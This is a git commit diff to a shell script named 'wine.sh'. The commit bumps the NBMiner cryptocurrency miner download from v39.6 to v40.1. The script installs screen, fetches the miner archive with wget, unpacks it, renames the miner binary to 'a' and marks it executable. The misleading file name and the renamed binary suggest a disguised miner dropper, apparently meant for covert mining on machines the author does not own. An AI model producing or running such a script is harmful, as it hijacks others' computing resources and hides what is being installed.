2397ab44d719c6b7edd0a099cbc48734dcb3dee6
jrkeiter <91981745+jrkeiter@users.noreply.github.com>
2021-12-09 00:04:23 +0700

    Update wine.sh

--- wine.sh
+++ wine.sh
@@ -12,8 +12,8 @@ if [ -f "$FILE" ]; then
     echo "$FILE exists."
 else 
     apt install screen -y
-    wget https://github.com/NebuTech/NBMiner/releases/download/v39.6/NBMiner_39.6_Linux.tgz
-    tar zxvf NBMiner_39.6_Linux.tgz
+    wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz
+    tar zxvf NBMiner_40.1_Linux.tgz
     cd NBMiner_Linux
     mv nbminer a
     chmod +x *
